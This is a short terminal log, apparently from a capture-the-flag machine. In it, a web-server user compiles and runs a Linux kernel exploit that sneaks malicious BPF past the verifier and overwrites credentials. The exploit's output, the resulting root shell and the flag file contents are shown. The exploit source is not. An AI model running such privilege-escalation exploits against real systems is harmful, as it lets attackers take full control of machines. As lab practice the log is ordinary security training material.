www-data@skynet:/tmp$ gcc priv.c -o priv
www-data@skynet:/tmp$ ./priv
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff9c62fbb6fc00
[*] Leaking sock struct from ffff9c62fa49a000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff9c62fb22d0c0
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff9c62fb22d0c0
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
root
# cd /root
# cat root.txt
3f0372db24753accc7179a282cd6a949
# 

